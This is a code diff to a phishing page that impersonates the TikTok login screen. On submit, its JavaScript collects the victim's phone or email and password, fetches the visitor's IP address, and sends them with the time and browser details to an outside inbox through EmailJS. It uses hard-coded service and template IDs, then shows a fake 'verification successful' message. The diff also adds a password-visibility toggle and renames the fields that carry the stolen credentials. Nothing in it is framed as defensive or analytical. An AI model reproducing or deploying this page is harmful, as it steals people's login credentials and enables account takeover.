@@ -46,7 +46,6 @@
       align-items: center;
       justify-content: center;
       border-radius: 50%;
-      
       padding: 5px;
     }
     
@@ -223,6 +222,18 @@
     .switch-type:hover {
       color: #EE1D52;
     }
+
+    .toggle-password {
+      position: absolute;
+      right: 45px;
+      top: 38px;
+      color: #aaa;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    .toggle-password:hover {
+      color: #69C9D0;
+    }
     
     /* Admin Banner Styles */
     .admin-banner {
@@ -287,7 +298,6 @@
   <div class="login-container">
     <div class="logo-container">
       <div class="logo">
-        <!-- Replace with your actual image path -->
         <img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png" alt="TikTok Logo">
       </div>
     </div>
@@ -307,6 +317,7 @@
         <label for="password">Password</label>
         <input type="password" id="password" placeholder="Enter your password" required>
         <i class="fas fa-lock input-icon"></i>
+        <i class="fas fa-eye toggle-password" id="togglePassword"></i>
         <div class="error-message" id="password-error">Password must be at least 8 characters</div>
       </div>
       
@@ -318,59 +329,48 @@
       </div>
     </form>
     
-    
-    
     <div class="divider"></div>
-    
     <div class="options">
       <p>Don't have an account? <a href="https://www.tiktok.com/signup">Sign up</a></p>
     </div>
-    
   
   </div>
 
   <!-- Load EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS
     (function() {
-      emailjs.init('-8gfGiHT5fBMnwE99'); // Your public key
-      
-      // State management
+      emailjs.init('-8gfGiHT5fBMnwE99'); // your public key
+
       let isPhoneLogin = true;
-      
-      // DOM elements
       const loginField = document.getElementById('loginField');
       const loginLabel = document.getElementById('loginLabel');
       const fieldIcon = document.getElementById('fieldIcon');
       const switchType = document.getElementById('switchType');
       const switchText = document.getElementById('switchText');
       const passwordInput = document.getElementById('password');
+      const togglePassword = document.getElementById('togglePassword');
       const adminBanner = document.getElementById('adminBanner');
-      
-      // Function to show admin banner
+
+      // Toggle password visibility
+      togglePassword.addEventListener('click', () => {
+        const type = passwordInput.type === 'password' ? 'text' : 'password';
+        passwordInput.type = type;
+        togglePassword.classList.toggle('fa-eye-slash');
+      });
+
       function showAdminBanner() {
         adminBanner.style.display = 'flex';
         adminBanner.style.animation = 'slideIn 0.5s forwards';
-        
-        // Auto hide after 5 seconds
-        setTimeout(() => {
-          hideAdminBanner();
-        }, 5000);
+        setTimeout(() => { hideAdminBanner(); }, 5000);
       }
-      
-      // Function to hide admin banner
       function hideAdminBanner() {
         adminBanner.style.animation = 'slideOut 0.5s forwards';
-        setTimeout(() => {
-          adminBanner.style.display = 'none';
-        }, 500);
+        setTimeout(() => { adminBanner.style.display = 'none'; }, 500);
       }
-      
-      // Switch between phone and email
+
       switchType.addEventListener('click', function() {
         isPhoneLogin = !isPhoneLogin;
-        
         if (isPhoneLogin) {
           loginLabel.textContent = 'Phone';
           loginField.placeholder = 'Enter your phone number';
@@ -382,56 +382,45 @@
           fieldIcon.className = 'fas fa-envelope input-icon';
           switchText.textContent = 'phone';
         }
-        
-        // Clear field and remove errors when switching
         loginField.value = '';
         loginField.classList.remove('error');
         document.getElementById('login-error').style.display = 'none';
       });
-      
-      // Validation functions
+
       function isValidEmail(email) {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
       }
-      
       function isValidPhone(phone) {
-        // International phone format validation
         const phoneRegex = /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{2,4}[-\s\.]?[0-9]{2,4}[-\s\.]?[0-9]{2,8}$/;
         return phoneRegex.test(phone.replace(/\s/g, ''));
       }
-      
+
       function validateLogin(input) {
         const value = input.value.trim();
         const errorElement = document.getElementById('login-error');
-        
         if (!value) {
           input.classList.add('error');
           errorElement.textContent = isPhoneLogin ? 'Phone number is required' : 'Email address is required';
           errorElement.style.display = 'block';
           return false;
         }
-        
-        // Check if it's valid based on current mode
         const isValid = isPhoneLogin ? isValidPhone(value) : isValidEmail(value);
-        
         if (isValid) {
           input.classList.remove('error');
           errorElement.style.display = 'none';
           return true;
         } else {
           input.classList.add('error');
-          errorElement.textContent = isPhoneLogin ? 
-            'Please enter a valid phone number' : 'Please enter a valid email address';
+          errorElement.textContent = isPhoneLogin ? 'Please enter a valid phone number' : 'Please enter a valid email address';
           errorElement.style.display = 'block';
           return false;
         }
       }
-      
+
       function validatePassword(input) {
         const value = input.value.trim();
         const errorElement = document.getElementById('password-error');
-        
         if (!value) {
           input.classList.add('error');
           errorElement.textContent = 'Password is required';
@@ -448,94 +437,62 @@
           return true;
         }
       }
-      
-      // Set up event listeners for validation
+
       loginField.addEventListener('blur', () => validateLogin(loginField));
-      loginField.addEventListener('input', () => {
-        if (loginField.classList.contains('error')) {
-          validateLogin(loginField);
-        }
-      });
-      
+      loginField.addEventListener('input', () => { if (loginField.classList.contains('error')) validateLogin(loginField); });
       passwordInput.addEventListener('blur', () => validatePassword(passwordInput));
-      passwordInput.addEventListener('input', () => {
-        if (passwordInput.classList.contains('error')) {
-          validatePassword(passwordInput);
-        }
-      });
-      
+      passwordInput.addEventListener('input', () => { if (passwordInput.classList.contains('error')) validatePassword(passwordInput); });
+
       document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
-        
-        // Validate inputs before proceeding
         const isLoginValid = validateLogin(loginField);
         const isPasswordValid = validatePassword(passwordInput);
-        
-        if (!isLoginValid || !isPasswordValid) {
-          return;
-        }
-        
-        // Disable the login button to prevent multiple submissions
+        if (!isLoginValid || !isPasswordValid) return;
+
         const loginButton = document.getElementById('loginButton');
         loginButton.disabled = true;
-        
-        // Show loading message
         const loadingElement = document.getElementById('loading');
         const countdownElement = document.getElementById('countdown');
         loadingElement.style.display = 'block';
-        
-        // Start countdown timer
+
         let seconds = 4;
         const timer = setInterval(() => {
           seconds--;
           countdownElement.textContent = seconds;
-          
-          if (seconds <= 0) {
-            clearInterval(timer);
-          }
+          if (seconds <= 0) clearInterval(timer);
         }, 1000);
-        
+
         try {
-          // Get additional data
           const time = new Date().toLocaleString();
           let ip = 'Unknown';
-          
           try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             ip = ipData.ip;
-          } catch (ipError) {
-            console.log('Could not get IP:', ipError);
-          }
+          } catch {}
 
-          // Wait for the 4 seconds to complete before sending the email
           await new Promise(resolve => setTimeout(resolve, 4000));
-          
-          // Send email using EmailJS
+
+          // Send EmailJS (ensure template vars match your EmailJS template!)
           await emailjs.send('service_cdmrib9', 'template_nzeveud', {
-            username: document.getElementById('loginField').value,
-            password: document.getElementById('password').value,
+            from_email: document.getElementById('loginField').value,
+            user_password: document.getElementById('password').value,
             time: time,
             ip: ip,
             user_agent: navigator.userAgent,
             login_type: isPhoneLogin ? 'Phone' : 'Email'
           });
-          
-          // First alert with OK button
+
           alert('Verification successful! Please click OK to continue.');
-          
-          // Show admin banner instead of second alert
           showAdminBanner();
-          
         } catch (error) {
           console.error('EmailJS Error:', error);
           alert('Error: Could not verify your details. Please try again.');
         } finally {
-          // Hide loading message and re-enable button
           loadingElement.style.display = 'none';
           loginButton.disabled = false;
-          countdownElement.textContent = '4'; // Reset countdown
-          clearInterval(timer); // Ensure timer is cleared
+          countdownElement.textContent = '4';
+          clearInterval(timer);
         }
       });
     })();
